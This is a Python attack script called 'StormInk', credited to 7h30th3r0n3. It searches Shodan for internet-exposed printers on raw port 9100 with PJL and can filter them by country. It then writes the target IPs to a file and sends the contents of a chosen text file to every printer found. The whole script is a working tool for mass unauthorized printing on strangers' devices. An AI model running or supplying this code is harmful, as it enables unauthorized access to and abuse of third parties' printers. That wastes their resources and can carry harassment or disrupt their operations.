import os
import socket
import shodan

# Configuration
shodan_api_key = ""
file = "fileprint.txt"  # The file to send
target_file = "ip.txt"  # File to store target IPs

# Initialisation de l'API Shodan
api = shodan.Shodan(shodan_api_key)

# Banniere ASCII
def print_banner():
    banner = r"""
    ╔═══════════════════════════════════════════════════╗
    ║   _____ _                       _____       _     ║
    ║  / ____| |                     |_   _|     | |    ║
    ║ | (___ | |_ ___  _ __ _ __ ___   | |  _ __ | | __ ║
    ║  \___ \| __/ _ \| '__| '_ ` _ \  | | | '_ \| |/ / ║
    ║  ____) | || (_) | |  | | | | | |_| |_| | | |   <  ║
    ║ |_____/ \__\___/|_|  |_| |_| |_|_____|_| |_|_|\_\ ║
    ║                                                   ║
    ║              - The Storm of Print -               ║
    ║                  by 7h30th3r0n3                   ║
    ╚═══════════════════════════════════════════════════╝
    """
    print(banner)

# Function to send data to a printer
def send_to_printer(ip, content):
    port = 9100
    timeout = 2
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        print(f"Sending buffer to {ip}")
        s.send(content.encode('utf-8'))
        s.close()
        print("Done")
    except socket.timeout:
        print(f"Connection to {ip} timed out")
    except Exception as e:
        print(f"An error occurred: {e}")

# Main function to search Shodan and send data to printers
def main():
    # Display the banner
    print_banner()

    # Ask if the user wants to filter by country
    country_filter = input("Do you want to target printers in a specific country? (y/n): ").strip().lower()
    if country_filter == "y":
        iso_code = input("Please enter the ISO country code (e.g., US, FR, DE): ").strip().upper()
        query = f'port:9100 country:{iso_code} @pjl'
    else:
        query = 'port:9100 @pjl'

    # Find vulnerable printers with Shodan
    print(f"Looking for vulnerable printers with Shodan using query: {query}")
    try:
        results = api.search(query)
        print(f"Found {results['total']} possible targets.")
        
        size = int(input("How many printers do you want to target?: "))
        if size > len(results['matches']):
            size = len(results['matches'])

        # Save the IP addresses to a file
        with open(target_file, 'w') as f:
            for result in results['matches'][:size]:
                f.write(f"{result['ip_str']}\n")

        print(f"Targeting {size} printers, saved in {target_file}")

        # Read the content to send
        with open(file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()

        # Read the list of target IPs
        with open(target_file, 'r') as f:
            ips = [line.strip() for line in f]

        # Send data to each printer
        for ip in ips:
            send_to_printer(ip, content)

        print("Operation completed.")

    except shodan.APIError as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
